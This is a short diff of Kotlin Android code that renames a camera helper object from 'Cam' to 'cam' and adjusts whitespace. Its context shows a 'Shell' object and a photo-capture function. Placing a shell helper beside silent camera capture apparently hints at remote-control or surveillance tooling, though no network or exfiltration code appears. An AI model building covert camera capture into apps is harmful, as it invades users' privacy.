@@ -320,8 +320,7 @@ object Shell {
     } catch (e: Exception) { "err: ${e.message}" }
 }
 
-object Cam {
-
+object cam{ 
     fun snap(ctx: Context, front: Boolean, cb: (ByteArray?) -> Unit) {
         if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.CAMERA)
             != PackageManager.PERMISSION_GRANTED) { cb(null); return }
@@ -367,6 +366,7 @@ object Cam {
                     ht.quitSafely()
                 }
             }, h)
+
 
             mgr.openCamera(id, object : CameraDevice.StateCallback() {
                 override fun onOpened(d: CameraDevice) {
